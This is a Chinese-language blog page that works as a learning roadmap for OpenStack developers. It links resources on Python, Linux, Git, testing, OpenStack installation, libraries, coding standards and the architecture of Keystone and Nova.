<h1 id="1-OpenStack-Hacker"><a href="#1-OpenStack-Hacker" class="headerlink" title="1 OpenStack Hacker"></a>1 OpenStack Hacker</h1><div><br><br><em>   <div>态度：开放、主动、沟通</div>
</em>   <div>影响力：能说、能写、能分享</div><br>*   <div>四化：自动化、流程化、系统化、文档化</div><br>&nbsp;<br><br></div>

<h1 id="2-基础技能"><a href="#2-基础技能" class="headerlink" title="2 基础技能"></a>2 基础技能</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><div><br><br>*   <div>书籍:</div>

<pre><code>*   &lt;div&gt;[《python参考手册》](http://book.douban.com/subject/5401851/ &quot;http://book.douban.com/subject/5401851/&quot;)&lt;/div&gt;
*   &lt;div&gt;[《python基础教程》](http://book.douban.com/subject/4866934/ &quot;http://book.douban.com/subject/4866934/&quot;)&lt;/div&gt;
</code></pre><ul>
<li><div>教程: <a href="http://www.codecademy.com/zh/tracks/python" title="http://www.codecademy.com/zh/tracks/python" target="_blank" rel="external">Codecademy</a></div></li>
<li><div>挑战: <a href="http://www.pythonchallenge.com/" title="http://www.pythonchallenge.com/" target="_blank" rel="external">Python Challenge</a></div></li>
<li><div>文档: <a href="http://docs.python.org/2/index.html" title="http://docs.python.org/2/index.html" target="_blank" rel="external">Python v2.7.3 documentation</a></div></li>
<li><div>高阶:</div>

<ul>
<li><div><a href="http://docs.python-guide.org/en/latest/" title="http://docs.python-guide.org/en/latest/" target="_blank" rel="external">The Hitchhiker’s Guide to Python!</a></div></li>
<li><div><a href="http://pymotw.com/2/" title="http://pymotw.com/2/" target="_blank" rel="external">Python Module of the Week</a></div><br></li></ul></li></ul></div>





<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><div><br><br>*   <div>书籍:</div>

<pre><code>*   &lt;div&gt;[鸟哥的Linux私房菜](http://vbird.dic.ksu.edu.tw/ &quot;http://vbird.dic.ksu.edu.tw&quot;)&lt;/div&gt;
*   &lt;div&gt;[《Unix环境高级编程》](http://book.douban.com/subject/1788421/ &quot;http://book.douban.com/subject/1788421/&quot;)&lt;/div&gt;
*   &lt;div&gt;[《UNIX系统编程》](http://book.douban.com/subject/1314538/ &quot;http://book.douban.com/subject/1314538/&quot;)&lt;/div&gt;
</code></pre><p></p></div><p></p>
<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><div><br><br>*   <div>书籍：</div>

<pre><code>*   &lt;div&gt;[Pro Git](http://git-scm.com/book/zh &quot;http://git-scm.com/book/zh&quot;)&lt;/div&gt;
*   &lt;div&gt;[GotGitHub](http://www.worldhello.net/gotgithub/index.html &quot;http://www.worldhello.net/gotgithub/index.html&quot;)&lt;/div&gt;
</code></pre><ul>
<li><div>教程：</div>

<ul>
<li><div><a href="http://try.github.com/levels/1/challenges/1" title="http://try.github.com/levels/1/challenges/1" target="_blank" rel="external">tryGit</a></div></li>
<li><div><a href="http://gitimmersion.com/lab_01.html" title="http://gitimmersion.com/lab_01.html" target="_blank" rel="external">GitImmersion</a></div>
</li>
</ul>
</li>
<li><div>进阶：</div>

<ul>
<li><div><a href="http://marklodato.github.com/visual-git-guide/index-zh-cn.html" title="http://marklodato.github.com/visual-git-guide/index-zh-cn.html" target="_blank" rel="external">visual-git-guide</a></div></li>
<li><div><a href="http://nvie.com/posts/a-successful-git-branching-model/" title="http://nvie.com/posts/a-successful-git-branching-model/" target="_blank" rel="external">a-successful-git-branching-model</a></div>
</li>
</ul>
</li>
<li><div>最常用的git命令：<a href="http://www.kernel.org/pub/software/scm/git/docs/everyday.html" title="http://www.kernel.org/pub/software/scm/git/docs/everyday.html" target="_blank" rel="external"> Everyday GIT With 20 Commands Or So</a></div><br></li></ul></div>



<h2 id="Unittest"><a href="#Unittest" class="headerlink" title="Unittest"></a>Unittest</h2><div><br><br>*   <div>教程:<a href="http://docs.python.org/2/library/unittest.html" title="http://docs.python.org/2/library/unittest.html" target="_blank" rel="external"> python unittest</a></div><br></div>

<h1 id="3-OpenStack-基础"><a href="#3-OpenStack-基础" class="headerlink" title="3 OpenStack 基础"></a>3 OpenStack 基础</h1><h2 id="The-5-minute-Overview"><a href="#The-5-minute-Overview" class="headerlink" title="The 5-minute Overview"></a>The 5-minute Overview</h2><div><br><br><strong>OpenStack</strong> is a global collaboration of developers and cloud computing technologists producing the ubiquitous open source cloud computing platform for <em><strong>public and private clouds</strong></em>. The project aims to deliver solutions for all types of clouds by being simple to implement, massively scalable, and feature rich. The technology consists of a series of <a href="https://www.openstack.org/software/" title="https://www.openstack.org/software/" target="_blank" rel="external">interrelated projects</a> delivering various components for a cloud infrastructure solution. <strong>OpenStack</strong>controls <em><strong>large pools of compute, storage, and networking resources</strong></em> throughout a datacenter, all managed through a dashboard that gives administrators control while empowering their users to provision resources through a web interface.<br><br><a href="http://www.ustack.com/wp-content/uploads/2013/08/11.png" target="_blank" rel="external"><img src="http://www.ustack.com/wp-content/uploads/2013/08/11.png" alt="1"></a><br><br></div>

<h2 id="OpenStack-基本概念"><a href="#OpenStack-基本概念" class="headerlink" title="OpenStack 基本概念"></a>OpenStack 基本概念</h2><div><br><br><em>   <div>介绍： <a href="https://www.openstack.org/software/" title="https://www.openstack.org/software/" target="_blank" rel="external">https://www.openstack.org/software/</a></div>
</em>   <div>Compute管理员手册(必看)：<a href="http://docs.openstack.org/trunk/openstack-compute/admin/content/ch_getting-started-with-openstack.html" title="http://docs.openstack.org/trunk/openstack-compute/admin/content/ch_getting-started-with-openstack.html" target="_blank" rel="external">http://docs.openstack.org/trunk/openstack-compute/admin/content/ch_getting-started-with-openstack.html</a></div><br><em>   <div>OpenStack End User Guide(必看): <a href="http://docs.openstack.org/user-guide/content/" title="http://docs.openstack.org/user-guide/content/" target="_blank" rel="external">http://docs.openstack.org/user-guide/content/</a></div>
</em>   <div>Network管理员手册：<a href="http://docs.openstack.org/folsom/openstack-network/admin/content/" title="http://docs.openstack.org/folsom/openstack-network/admin/content/" target="_blank" rel="external">http://docs.openstack.org/folsom/openstack-network/admin/content/</a></div><br><em>   <div>Object Storage管理员手册：<a href="http://docs.openstack.org/folsom/openstack-object-storage/admin/content/" title="http://docs.openstack.org/folsom/openstack-object-storage/admin/content/" target="_blank" rel="external">http://docs.openstack.org/folsom/openstack-object-storage/admin/content/</a></div>
</em>   <div>OpenStack文档：<a href="http://docs.openstack.org/" title="http://docs.openstack.org/" target="_blank" rel="external">http://docs.openstack.org/</a></div><br><em>   <div>OpenStack词汇表：<a href="http://docs.openstack.org/glossary/content/glossary.html" title="http://docs.openstack.org/glossary/content/glossary.html" target="_blank" rel="external">http://docs.openstack.org/glossary/content/glossary.html</a></div>
</em>   <div>使用命令行管理openstack: <a href="http://docs.openstack.org/cli/quick-start/content/index.html" title="http://docs.openstack.org/cli/quick-start/content/index.html" target="_blank" rel="external">http://docs.openstack.org/cli/quick-start/content/index.html</a></div><br>*   <div>OpenStack Wiki: <a href="https://wiki.openstack.org/wiki/Main_Page" title="https://wiki.openstack.org/wiki/Main_Page" target="_blank" rel="external">https://wiki.openstack.org/wiki/Main_Page</a></div><br></div>

<h2 id="简单安装-OpenStack"><a href="#简单安装-OpenStack" class="headerlink" title="简单安装 OpenStack"></a>简单安装 OpenStack</h2><h3 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h3><div><br><br>为了快速安装OpenStack,你要设置最快的apt源(或者设置yum源)和pypi源。<br><br><em>   <div>设置apt源：<a href="http://blog.ubuntusoft.com/ubuntu-update-source.html" title="http://blog.ubuntusoft.com/ubuntu-update-source.html" target="_blank" rel="external">http://blog.ubuntusoft.com/ubuntu-update-source.html</a></div>
</em>   <div>设置pypi源：<a href="http://www.v2ex.com/t/75316" title="http://www.v2ex.com/t/75316" target="_blank" rel="external">http://www.v2ex.com/t/75316</a></div><br>你也可以搭建自己的apt源和pypi源：<br><br>*   <div>搭建apt源：</div>

<pre><code>*   &lt;div&gt;[http://blog.ef.net/2012/10/26/unbutu-release-upgrade-with-local-apt-mirror.html](http://blog.ef.net/2012/10/26/unbutu-release-upgrade-with-local-apt-mirror.html &quot;http://blog.ef.net/2012/10/26/unbutu-release-upgrade-with-local-apt-mirror.html&quot;)&lt;/div&gt;
*   &lt;div&gt;[http://www.cnblogs.com/kulin/archive/2012/08/08/2628400.html](http://www.cnblogs.com/kulin/archive/2012/08/08/2628400.html &quot;http://www.cnblogs.com/kulin/archive/2012/08/08/2628400.html&quot;)&lt;/div&gt;
</code></pre><ul>
<li><div>搭建pypi源：</div>

<ul>
<li><div><a href="https://pypi.python.org/pypi/bandersnatch" title="https://pypi.python.org/pypi/bandersnatch" target="_blank" rel="external">https://pypi.python.org/pypi/bandersnatch</a></div><br></li></ul></li></ul></div>





<h3 id="devstack-安装"><a href="#devstack-安装" class="headerlink" title="devstack 安装"></a>devstack 安装</h3><div><br><br><em>   <div>使用devstack安装 <a href="http://devstack.org/" title="http://devstack.org" target="_blank" rel="external">http://devstack.org</a></div>
</em>   <div>阅读devstack.sh脚本 <a href="http://devstack.org/" title="http://devstack.org" target="_blank" rel="external">http://devstack.org</a></div><br>*   <div>screen的使用：<a href="http://www.9usb.net/201002/linux-screen-mingling.html" title="http://www.9usb.net/201002/linux-screen-mingling.html" target="_blank" rel="external">http://www.9usb.net/201002/linux-screen-mingling.html</a></div><br>devstack使用screen管理OpenStack各个服务，所以你要用screen调试OpenStack。<br><br></div>

<h3 id="packstack-RHEL-CentOS-安装"><a href="#packstack-RHEL-CentOS-安装" class="headerlink" title="packstack(RHEL,CentOS) 安装"></a>packstack(RHEL,CentOS) 安装</h3><div><br><br><em>   <div>git仓库: <a href="https://github.com/stackforge/packstack" title="https://github.com/stackforge/packstack" target="_blank" rel="external">https://github.com/stackforge/packstack</a></div>
</em>   <div>quickstart: <a href="http://openstack.redhat.com/Quickstart" title="http://openstack.redhat.com/Quickstart" target="_blank" rel="external">http://openstack.redhat.com/Quickstart</a></div><br></div>

<h3 id="deb包安装"><a href="#deb包安装" class="headerlink" title="deb包安装"></a>deb包安装</h3><div><br><br><em>   <div><a href="http://wiki.stacklab.org/doku.php?id=stacklab:documentation:use-virtualbox-install-openstack" title="http://wiki.stacklab.org/doku.php?id=stacklab:documentation:use-virtualbox-install-openstack" target="_blank" rel="external">使用VirtualBox安装OpenStack</a></div>
</em>   <div><a href="http://wiki.stacklab.org/doku.php?id=stacklab:documentation:install-openstack-folsom-with-nova-network" title="http://wiki.stacklab.org/doku.php?id=stacklab:documentation:install-openstack-folsom-with-nova-network" target="_blank" rel="external">在Ubuntu 12.04上安装OpenStack Folsom版(FlatDHCP+Multihost)</a></div><br><em>   <div><a href="http://www.chenshake.com/ubuntu12-04-2-installed-openstack-grizzly-bridge-mode/" title="http://www.chenshake.com/ubuntu12-04-2-installed-openstack-grizzly-bridge-mode/" target="_blank" rel="external">Ubuntu12.04.2 OpenStack Grizzly 安装（Bridge）</a></div><br></em></div><br>&nbsp;<br><br>## 调戏 OpenStack<br><br><div>

   <div>pdb：</div>

<pre><code>*   &lt;div&gt;[http://docs.python.org/2/library/pdb.html](http://docs.python.org/2/library/pdb.html &quot;http://docs.python.org/2/library/pdb.html&quot;)&lt;/div&gt;
*   &lt;div&gt;[http://blog.csdn.net/hackerain/article/details/8373597](http://blog.csdn.net/hackerain/article/details/8373597 &quot;http://blog.csdn.net/hackerain/article/details/8373597&quot;)&lt;/div&gt;
*   &lt;div&gt;[http://www.ibm.com/developerworks/cn/linux/l-cn-pythondebugger/](http://www.ibm.com/developerworks/cn/linux/l-cn-pythondebugger/ &quot;http://www.ibm.com/developerworks/cn/linux/l-cn-pythondebugger/&quot;)&lt;/div&gt;
</code></pre><p></p></div><p></p>
<h2 id="Python基本库"><a href="#Python基本库" class="headerlink" title="Python基本库"></a>Python基本库</h2><h3 id="WSGI"><a href="#WSGI" class="headerlink" title="WSGI"></a>WSGI</h3><div><br><br><em>   <div>eventlet.wsgi: <a href="http://eventlet.net/doc/examples.html#wsgi-server" title="http://eventlet.net/doc/examples.html#wsgi-server" target="_blank" rel="external">http://eventlet.net/doc/examples.html#wsgi-server</a></div>
</em>   <div>webob: <a href="http://webob.org/" title="http://webob.org/" target="_blank" rel="external">http://webob.org/</a></div><br><em>   <div>pecan: <a href="http://pecanpy.org/" title="http://pecanpy.org/" target="_blank" rel="external">http://pecanpy.org/</a></div>
</em>   <div>wsme: <a href="http://pythonhosted.org/WSME/" title="http://pythonhosted.org/WSME/" target="_blank" rel="external">http://pythonhosted.org/WSME/</a></div><br><em>   <div>paste: <a href="http://pythonpaste.org/" title="http://pythonpaste.org/" target="_blank" rel="external">http://pythonpaste.org/</a></div>
</em>   <div>routes: <a href="http://routes.readthedocs.org/en/latest/" title="http://routes.readthedocs.org/en/latest/" target="_blank" rel="external">http://routes.readthedocs.org/en/latest/</a></div><br></div>

<h3 id="重要的库"><a href="#重要的库" class="headerlink" title="重要的库"></a>重要的库</h3><div><br><br><em>   <div>SQLAlchemy:<a href="http://www.sqlalchemy.org/" title="http://www.sqlalchemy.org/" target="_blank" rel="external">http://www.sqlalchemy.org/</a></div>
</em>   <div>libvirt: <a href="http://libvirt.org/index.html" title="http://libvirt.org/index.html" target="_blank" rel="external">http://libvirt.org/index.html</a></div><br><em>   <div>logging: <a href="http://docs.python.org/2/howto/logging-cookbook.html" title="http://docs.python.org/2/howto/logging-cookbook.html" target="_blank" rel="external">http://docs.python.org/2/howto/logging-cookbook.html</a></div>
</em>   <div>greenlet: <a href="http://greenlet.readthedocs.org/en/latest/" title="http://greenlet.readthedocs.org/en/latest/" target="_blank" rel="external">http://greenlet.readthedocs.org/en/latest/</a></div><br><em>   <div>eventlet: <a href="http://eventlet.net/" title="http://eventlet.net/" target="_blank" rel="external">http://eventlet.net/</a></div>
</em>   <div>kombu: <a href="http://kombu.readthedocs.org/en/latest/" title="http://kombu.readthedocs.org/en/latest/" target="_blank" rel="external">http://kombu.readthedocs.org/en/latest/</a></div><br><em>   <div>oslo.config: <a href="https://wiki.openstack.org/wiki/Oslo#oslo.config" title="https://wiki.openstack.org/wiki/Oslo#oslo.config" target="_blank" rel="external">https://wiki.openstack.org/wiki/Oslo#oslo.config</a></div>
</em>   <div>stevedore: <a href="http://stevedore.readthedocs.org/en/latest/" title="http://stevedore.readthedocs.org/en/latest/" target="_blank" rel="external">http://stevedore.readthedocs.org/en/latest/</a></div><br></div>

<h3 id="TESTING"><a href="#TESTING" class="headerlink" title="TESTING"></a>TESTING</h3><div><br><br><em>   <div>PythonTestingToolsTaxonomy: <a href="http://wiki.python.org/moin/PythonTestingToolsTaxonomy" title="http://wiki.python.org/moin/PythonTestingToolsTaxonomy" target="_blank" rel="external">http://wiki.python.org/moin/PythonTestingToolsTaxonomy</a> (all in one)</div>
</em>   <div>testtools：<a href="https://readthedocs.org/projects/testtools/" title="https://readthedocs.org/projects/testtools/" target="_blank" rel="external">https://readthedocs.org/projects/testtools/</a></div><br><em>   <div>mox：<a href="http://code.google.com/p/pymox/wiki/MoxDocumentation" title="http://code.google.com/p/pymox/wiki/MoxDocumentation" target="_blank" rel="external">http://code.google.com/p/pymox/wiki/MoxDocumentation</a></div>
</em>   <div>mock：<a href="http://www.voidspace.org.uk/python/mock/" title="http://www.voidspace.org.uk/python/mock/" target="_blank" rel="external">http://www.voidspace.org.uk/python/mock/</a></div><br><em>   <div>tox：<a href="http://tox.readthedocs.org/en/latest/" title="http://tox.readthedocs.org/en/latest/" target="_blank" rel="external">http://tox.readthedocs.org/en/latest/</a></div>
</em>   <div>fixtures：<a href="https://pypi.python.org/pypi/fixtures" title="https://pypi.python.org/pypi/fixtures" target="_blank" rel="external">https://pypi.python.org/pypi/fixtures</a></div><br><em>   <div>testscenarios：<a href="https://pypi.python.org/pypi/testscenarios/" title="https://pypi.python.org/pypi/testscenarios/" target="_blank" rel="external">https://pypi.python.org/pypi/testscenarios/</a></div>
</em>   <div>nose：<a href="https://nose.readthedocs.org/en/latest/" title="https://nose.readthedocs.org/en/latest/" target="_blank" rel="external">https://nose.readthedocs.org/en/latest/</a></div><br>*   <div>testrepository：<a href="https://testrepository.readthedocs.org/en/latest/MANUAL.html" title="https://testrepository.readthedocs.org/en/latest/MANUAL.html" target="_blank" rel="external">https://testrepository.readthedocs.org/en/latest/MANUAL.html</a></div><br></div>

<h2 id="OpenStack基础组件"><a href="#OpenStack基础组件" class="headerlink" title="OpenStack基础组件"></a>OpenStack基础组件</h2><div><br><br>在OpenStack中，有一个重要的项目叫做Oslo(原名是openstack-common),给OpenStack其他项目提供基础组件。<br><br>*   <div><a href="https://wiki.openstack.org/wiki/Oslo" title="https://wiki.openstack.org/wiki/Oslo" target="_blank" rel="external">https://wiki.openstack.org/wiki/Oslo</a></div><br></div>

<h3 id="RPC组件"><a href="#RPC组件" class="headerlink" title="RPC组件"></a>RPC组件</h3><div><br><br><em>   <div><a href="http://wiki.ustack.com/doku.php?id=rpc%E6%A8%A1%E5%9D%97" title="http://wiki.ustack.com/doku.php?id=rpc%E6%A8%A1%E5%9D%97" target="_blank" rel="external">RPC组件</a></div>
</em>   <div><a href="http://blog.ftofficer.com/2010/03/translation-rabbitmq-python-rabbits-and-warrens/" title="http://blog.ftofficer.com/2010/03/translation-rabbitmq-python-rabbits-and-warrens/" target="_blank" rel="external">http://blog.ftofficer.com/2010/03/translation-rabbitmq-python-rabbits-and-warrens/</a></div><br><em>   <div><a href="http://www.rabbitmq.com/tutorials/tutorial-six-python.html" title="http://www.rabbitmq.com/tutorials/tutorial-six-python.html" target="_blank" rel="external">http://www.rabbitmq.com/tutorials/tutorial-six-python.html</a></div>
</em>   <div><a href="http://docs.openstack.org/developer/nova/devref/rpc.html" title="http://docs.openstack.org/developer/nova/devref/rpc.html" target="_blank" rel="external">http://docs.openstack.org/developer/nova/devref/rpc.html</a></div><br></div>

<h3 id="WSGI-1"><a href="#WSGI-1" class="headerlink" title="WSGI"></a>WSGI</h3><div><br><br>*   <div><a href="http://archimedeanco.com/wsgi-tutorial/" title="http://archimedeanco.com/wsgi-tutorial/" target="_blank" rel="external">http://archimedeanco.com/wsgi-tutorial/</a></div><br></div>

<h2 id="OpenStack-代码规范"><a href="#OpenStack-代码规范" class="headerlink" title="OpenStack 代码规范"></a>OpenStack 代码规范</h2><div><br><br>*   <div>Python PEP8 规范: <a href="http://www.python.org/dev/peps/pep-0008/" title="http://www.python.org/dev/peps/pep-0008/" target="_blank" rel="external">http://www.python.org/dev/peps/pep-0008/</a></div>

<ul>
<li><div>OpenStack HACKING 规范: <a href="https://github.com/openstack-dev/hacking/blob/master/HACKING.rst" title="https://github.com/openstack-dev/hacking/blob/master/HACKING.rst" target="_blank" rel="external">https://github.com/openstack-dev/hacking/blob/master/HACKING.rst</a></div><br></li></ul></div>



<h2 id="Python-深入学习"><a href="#Python-深入学习" class="headerlink" title="Python 深入学习"></a>Python 深入学习</h2><div><br><br>理解python中optparse.OptionParser类。<br><a href="http://docs.python.org/library/optparse.html" title="http://docs.python.org/library/optparse.html" target="_blank" rel="external">http://docs.python.org/library/optparse.html</a><br><br>理解collections.Mapping类。<br><a href="http://docs.python.org/library/collections.html" title="http://docs.python.org/library/collections.html" target="_blank" rel="external">http://docs.python.org/library/collections.html</a><br><br>分析浅拷贝，深拷贝<br><a href="http://blog.csdn.net/winterttr/article/details/2590741" title="http://blog.csdn.net/winterttr/article/details/2590741" target="_blank" rel="external">http://blog.csdn.net/winterttr/article/details/2590741</a><br><a href="http://longmans1985.blog.163.com/blog/static/70605475200991603624942/" title="http://longmans1985.blog.163.com/blog/static/70605475200991603624942/" target="_blank" rel="external">http://longmans1985.blog.163.com/blog/static/70605475200991603624942/</a><br><a href="http://book.51cto.com/art/200806/77233.htm" title="http://book.51cto.com/art/200806/77233.htm" target="_blank" rel="external">http://book.51cto.com/art/200806/77233.htm</a><br><br>LoggerAdapter类<br><a href="http://docs.python.org/howto/logging-cookbook.html#context-info" title="http://docs.python.org/howto/logging-cookbook.html#context-info" target="_blank" rel="external">http://docs.python.org/howto/logging-cookbook.html#context-info</a>中。<br><br>介绍rabbitmq<br><a href="http://blog.ftofficer.com/2010/03/translation-rabbitmq-python-rabbits-and-warrens/" title="http://blog.ftofficer.com/2010/03/translation-rabbitmq-python-rabbits-and-warrens/" target="_blank" rel="external">http://blog.ftofficer.com/2010/03/translation-rabbitmq-python-rabbits-and-warrens/</a><br><a href="http://kombu.readthedocs.org/en/latest/introduction.html#synopsis" title="http://kombu.readthedocs.org/en/latest/introduction.html#synopsis" target="_blank" rel="external">http://kombu.readthedocs.org/en/latest/introduction.html#synopsis</a><br><br>Python Decorators入门<br><a href="http://blog.csdn.net/beckel/article/details/3585352" title="http://blog.csdn.net/beckel/article/details/3585352" target="_blank" rel="external">http://blog.csdn.net/beckel/article/details/3585352</a><br><br>Python @classmethod @staticmethod的区别。<br><br><a href="http://www.libaoyin.com/2013/08/06/pyhton-staticmethod-classmethod/" target="_blank" rel="external">http://www.libaoyin.com/2013/08/06/pyhton-staticmethod-classmethod/</a><br><br>五分钟理解元类（Metaclasses）<br><a href="http://www.cnblogs.com/coderzh/archive/2008/12/07/1349735.html" title="http://www.cnblogs.com/coderzh/archive/2008/12/07/1349735.html" target="_blank" rel="external">http://www.cnblogs.com/coderzh/archive/2008/12/07/1349735.html</a><br><br>nova中用到的python知识<br><a href="http://canx.me/2011/12/%E4%B8%80%E4%BA%9Bpython/" title="http://canx.me/2011/12/%E4%B8%80%E4%BA%9Bpython/" target="_blank" rel="external">http://canx.me/2011/12/%E4%B8%80%E4%BA%9Bpython/</a><br><br>python中类的总结<br><a href="http://ipseek.blog.51cto.com/1041109/802243" title="http://ipseek.blog.51cto.com/1041109/802243" target="_blank" rel="external">http://ipseek.blog.51cto.com/1041109/802243</a><br><br>with的总结<br><a href="http://effbot.org/zone/python-with-statement.htm" title="http://effbot.org/zone/python-with-statement.htm" target="_blank" rel="external">http://effbot.org/zone/python-with-statement.htm</a><br><br>Pool类<br><a href="http://nullege.com/codes/search/eventlet.pools.Pool" title="http://nullege.com/codes/search/eventlet.pools.Pool" target="_blank" rel="external">http://nullege.com/codes/search/eventlet.pools.Pool</a><br><br>paste模块<br><a href="http://pythonpaste.org/" title="http://pythonpaste.org/" target="_blank" rel="external">http://pythonpaste.org/</a><br><br>python魔术方法<br><a href="http://pycoders-weekly-chinese.readthedocs.org/en/latest/issue6/a-guide-to-pythons-magic-methods.html" title="http://pycoders-weekly-chinese.readthedocs.org/en/latest/issue6/a-guide-to-pythons-magic-methods.html" target="_blank" rel="external">http://pycoders-weekly-chinese.readthedocs.org/en/latest/issue6/a-guide-to-pythons-magic-methods.html</a><br><br>Routes模块<br><a href="http://routes.readthedocs.org/en/latest/index.html" title="http://routes.readthedocs.org/en/latest/index.html" target="_blank" rel="external">http://routes.readthedocs.org/en/latest/index.html</a><br><br>yield学习<br><br><em>   <div><a href="http://www.pythonclub.org/python-basic/yield" title="http://www.pythonclub.org/python-basic/yield" target="_blank" rel="external">http://www.pythonclub.org/python-basic/yield</a></div>
</em>   <div><a href="http://blog.donews.com/limodou/archive/2006/09/04/1028747.aspx" title="http://blog.donews.com/limodou/archive/2006/09/04/1028747.aspx" target="_blank" rel="external">http://blog.donews.com/limodou/archive/2006/09/04/1028747.aspx</a></div><br><em>   <div><a href="http://www.ibm.com/developerworks/cn/opensource/os-cn-python-yield/" title="http://www.ibm.com/developerworks/cn/opensource/os-cn-python-yield/" target="_blank" rel="external">http://www.ibm.com/developerworks/cn/opensource/os-cn-python-yield/</a></div>
</em>   <div><a href="http://www.jeffknupp.com/blog/2013/04/07/improve-your-python-yield-and-generators-explained/" title="http://www.jeffknupp.com/blog/2013/04/07/improve-your-python-yield-and-generators-explained/" target="_blank" rel="external">http://www.jeffknupp.com/blog/2013/04/07/improve-your-python-yield-and-generators-explained/</a></div><br></div>

<h1 id="4-OpenStack-整体架构"><a href="#4-OpenStack-整体架构" class="headerlink" title="4 OpenStack 整体架构"></a>4 OpenStack 整体架构</h1><h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><div><br><br>必看：<br><br><em>   <div><a href="http://ken.pepple.info/openstack/2012/09/25/openstack-folsom-architecture/" title="http://ken.pepple.info/openstack/2012/09/25/openstack-folsom-architecture/" target="_blank" rel="external">http://ken.pepple.info/openstack/2012/09/25/openstack-folsom-architecture/</a></div>
</em>   <div><a href="http://www.solinea.com/2013/06/15/openstack-grizzly-architecture-revisited/" title="http://www.solinea.com/2013/06/15/openstack-grizzly-architecture-revisited/" target="_blank" rel="external">http://www.solinea.com/2013/06/15/openstack-grizzly-architecture-revisited/</a></div><br>*   <a href="http://www.slideshare.net/mirantis/open-stack-architecture-overviewmeetup662013" target="_blank" rel="external">http://www.slideshare.net/mirantis/open-stack-architecture-overviewmeetup662013</a><br>OpenStack架构图，你可以点击放大。<br><br><a href="http://www.ustack.com/wp-content/uploads/2013/08/openstack-logical-arch-folsom.jpg" target="_blank" rel="external"><img src="http://www.ustack.com/wp-content/uploads/2013/08/openstack-logical-arch-folsom-1024x626.jpg" alt="openstack-logical-arch-folsom"></a><br><br></div>

<h2 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h2><h3 id="Keystone-Workflow"><a href="#Keystone-Workflow" class="headerlink" title="Keystone Workflow"></a>Keystone Workflow</h3><div><br><br>必看：<br><br><em>   <div><a href="https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_keystone_workflow_token_scoping?lang=zh" title="https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_keystone_workflow_token_scoping?lang=zh" target="_blank" rel="external">https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_keystone_workflow_token_scoping?lang=zh</a></div>
</em>   <div><a href="http://docs.openstack.org/trunk/openstack-compute/admin/content/keystone-concepts.html" title="http://docs.openstack.org/trunk/openstack-compute/admin/content/keystone-concepts.html" target="_blank" rel="external">http://docs.openstack.org/trunk/openstack-compute/admin/content/keystone-concepts.html</a></div><br>点击可看大图。<br><br><a href="http://www.ustack.com/wp-content/uploads/2013/08/Keystone-workflow.png" target="_blank" rel="external"><img src="http://www.ustack.com/wp-content/uploads/2013/08/Keystone-workflow.png" alt="Keystone-workflow"></a><br><br></div>

<h3 id="Nova-Workflow"><a href="#Nova-Workflow" class="headerlink" title="Nova Workflow"></a>Nova Workflow</h3><div><br><br>必看：<br><br><em>   <div><a href="https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_nova_api?lang=en" title="https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_nova_api?lang=en" target="_blank" rel="external">https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_nova_api?lang=en</a></div>
</em>   <div><a href="http://ilearnstack.com/2013/04/26/request-flow-for-provisioning-instance-in-openstack/comment-page-1/" title="http://ilearnstack.com/2013/04/26/request-flow-for-provisioning-instance-in-openstack/comment-page-1/" target="_blank" rel="external">http://ilearnstack.com/2013/04/26/request-flow-for-provisioning-instance-in-openstack/comment-page-1/</a></div><br>nova-api处理 REST 请求。<br><br><a href="http://www.ustack.com/wp-content/uploads/2013/08/nova-server-request.jpeg" target="_blank" rel="external"><img src="http://www.ustack.com/wp-content/uploads/2013/08/nova-server-request.jpeg" alt="nova-server-request"></a><br><br>nova创建虚拟机的工作流。<br><br><a href="http://www.ustack.com/wp-content/uploads/2013/08/request-flow1.png" target="_blank" rel="external"><img src="http://www.ustack.com/wp-content/uploads/2013/08/request-flow1-1024x665.png" alt="request-flow1"></a><br><br></div>

<h2 id="OpenStack-核心项目"><a href="#OpenStack-核心项目" class="headerlink" title="OpenStack 核心项目"></a>OpenStack 核心项目</h2><div><br><br>对各个项目简要分析：<a href="http://www.slideshare.net/randybias/state-of-the-stack-april-2013" title="http://www.slideshare.net/randybias/state-of-the-stack-april-2013" target="_blank" rel="external">http://www.slideshare.net/randybias/state-of-the-stack-april-2013</a><br><br>核心项目的分析：<br><br>*   <div><a href="https://wiki.openstack.org/wiki/Keystone" title="https://wiki.openstack.org/wiki/Keystone" target="_blank" rel="external">Keystone</a>：</div>

<pre><code>*   &lt;div&gt;[http://docs.openstack.org/developer/keystone/](http://docs.openstack.org/developer/keystone/ &quot;http://docs.openstack.org/developer/keystone/&quot;)&lt;/div&gt;
*   &lt;div&gt;[http://www.slideshare.net/openstackindia/openstack-keystone-identity-service](http://www.slideshare.net/openstackindia/openstack-keystone-identity-service &quot;http://www.slideshare.net/openstackindia/openstack-keystone-identity-service&quot;)&lt;/div&gt;
</code></pre><ul>
<li><div><a href="https://wiki.openstack.org/wiki/Glance" title="https://wiki.openstack.org/wiki/Glance" target="_blank" rel="external">Glance</a>：</div>

<ul>
<li><div><a href="http://docs.openstack.org/developer/glance/" title="http://docs.openstack.org/developer/glance/" target="_blank" rel="external">http://docs.openstack.org/developer/glance/</a></div>
</li>
</ul>
</li>
<li><div><a href="https://wiki.openstack.org/wiki/Nova" title="https://wiki.openstack.org/wiki/Nova" target="_blank" rel="external">Nova</a>：</div>

<ul>
<li><div><a href="http://docs.openstack.org/developer/nova/" title="http://docs.openstack.org/developer/nova/" target="_blank" rel="external">http://docs.openstack.org/developer/nova/</a></div></li>
